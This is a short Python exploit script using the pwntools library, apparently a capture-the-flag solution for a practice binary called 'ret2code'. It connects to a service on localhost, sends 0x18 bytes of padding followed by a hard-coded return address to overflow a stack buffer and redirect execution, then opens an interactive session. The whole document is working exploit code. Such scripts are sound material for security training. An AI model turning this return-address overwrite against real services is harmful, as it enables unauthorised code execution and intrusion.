from pwn import *

io = remote('localhost', '8305')
# io = process('./ret2code')

io.recvline()
io.sendline(b'a'*0x18 + p64(0x401156))

io.interactive()
